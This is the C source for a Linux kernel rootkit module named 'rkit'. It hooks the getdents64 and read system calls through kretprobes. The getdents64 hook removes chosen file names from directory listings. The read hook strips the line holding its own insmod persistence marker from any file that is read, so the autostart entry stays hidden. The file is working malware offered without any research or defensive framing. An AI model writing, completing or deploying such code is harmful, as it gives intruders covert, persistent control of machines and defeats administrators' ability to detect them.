#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include "hook.h"
#include "hide.h"

#define PERSIST_MARKER "insmod /lib/modules/rkit"

/* ── getdents64 ─────────────────────────────────────────────────── */
struct gd64_data { struct linux_dirent64 __user *dirent; };

static int gd64_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    ((struct gd64_data *)ri->data)->dirent =
        (struct linux_dirent64 __user *)((struct pt_regs *)regs->di)->si;
    return 0;
}

static int gd64_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct gd64_data *d = (struct gd64_data *)ri->data;
    long ret = regs_return_value(regs);
    long offset = 0, new_ret = 0;
    struct linux_dirent64 *kbuf, *cur;

    if (ret <= 0) return 0;
    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf) return 0;
    if (copy_from_user(kbuf, d->dirent, ret)) { kfree(kbuf); return 0; }
    while (offset < ret) {
        cur = (struct linux_dirent64 *)((char *)kbuf + offset);
        if (!hide_should_filter(cur->d_name)) {
            memmove((char *)kbuf + new_ret, cur, cur->d_reclen);
            new_ret += cur->d_reclen;
        }
        offset += cur->d_reclen;
    }
    if (new_ret < ret && copy_to_user(d->dirent, kbuf, new_ret) == 0)
        regs_set_return_value(regs, new_ret);
    kfree(kbuf);
    return 0;
}

static struct kretprobe krp_gd64 = {
    .entry_handler  = gd64_entry,
    .handler        = gd64_ret,
    .data_size      = sizeof(struct gd64_data),
    .maxactive      = 20,
    .kp.symbol_name = "__x64_sys_getdents64",
};

/* ── read ───────────────────────────────────────────────────────── */
struct read_data { char __user *buf; };

static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    ((struct read_data *)ri->data)->buf = (char __user *)((struct pt_regs *)regs->di)->si;
    return 0;
}

static int read_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct read_data *d = (struct read_data *)ri->data;
    long ret = regs_return_value(regs);
    char *kbuf, *pos, *end;
    long new_ret;

    if (ret <= 0) return 0;
    kbuf = kzalloc(ret + 1, GFP_KERNEL);
    if (!kbuf) return 0;
    if (copy_from_user(kbuf, d->buf, ret)) { kfree(kbuf); return 0; }
    pos = strnstr(kbuf, PERSIST_MARKER, ret);
    if (pos) {
        end = memchr(pos, '\n', ret - (pos - kbuf));
        if (end) end++; else end = kbuf + ret;
        new_ret = (pos - kbuf) + (kbuf + ret - end);
        memmove(pos, end, kbuf + ret - end);
        if (copy_to_user(d->buf, kbuf, new_ret) == 0)
            regs_set_return_value(regs, new_ret);
    }
    kfree(kbuf);
    return 0;
}

static struct kretprobe krp_read = {
    .entry_handler  = read_entry,
    .handler        = read_ret,
    .data_size      = sizeof(struct read_data),
    .maxactive      = 32,
    .kp.symbol_name = "__x64_sys_read",
};

/* ── API ────────────────────────────────────────────────────────── */
int hook_install(void)
{
    int r = register_kretprobe(&krp_gd64);
    if (r) { printk(KERN_ERR "rkit: gd64 krp failed %d\n", r); return r; }
    r = register_kretprobe(&krp_read);
    if (r) {
        printk(KERN_ERR "rkit: read krp failed %d\n", r);
        unregister_kretprobe(&krp_gd64);
        return r;
    }
    printk(KERN_INFO "rkit: kretprobes OK\n");
    return 0;
}

void hook_remove(void)
{
    unregister_kretprobe(&krp_read);
    unregister_kretprobe(&krp_gd64);
}
